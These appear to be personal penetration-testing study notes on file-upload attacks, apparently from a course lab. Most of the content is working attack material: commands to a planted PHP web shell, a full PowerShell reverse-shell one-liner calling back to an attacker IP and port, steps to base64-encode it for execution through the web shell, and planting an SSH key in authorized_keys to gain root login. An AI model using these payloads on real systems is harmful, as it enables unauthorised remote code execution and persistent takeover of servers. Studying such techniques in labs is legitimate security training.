# Attacks

- Example:
		- `curl http://192.168.50.189/meteor/uploads/simple-backdoor.pHP?cmd=dir`
- [[Powershell]]
			1. PowerShell on Kali
				-  pwsh
			2. Create text variable to store reverse shell one-liner
				- PS > `$Text = '$client = New-Object System.Net.Sockets.TCPClient("192.168.119.3",4444);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + "PS " + (pwd).Path + "> ";$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()'`
			3. Use convert method and unicode property to encode
				- `$Bytes = [System.Text.Encoding]::Unicode.GetBytes($Text)`
				- `$EncodedText =[Convert]::ToBase64String($Bytes)`
				- `$EncodedText`
				- `exit`
			4. Use curl to execute
				- curl http://192.168.50.189/meteor/uploads/simple-backdoor.pHP?cmd=powershell%20-enc%20JABjAGwAaQBlAG4AdAAgAD0AIABOAGUAdwAtAE8AYgBqAGUAYwB0ACAAUwB5AHMAdABlAG0ALgBOAGUAdAAuAFMAbwBjAGsAZQB0
					- -enc
						- for base64 encoding
- Using Non-Executable Files
	- Example
		- ssh-keygen
		- cat fileup.pub > authorized keys
		- ![[Pasted image 20240225221910.png]]
		- rm ~/.ssh/known_hosts
		- ssh -p 2222 -i fileup root@mountaindesserts.com
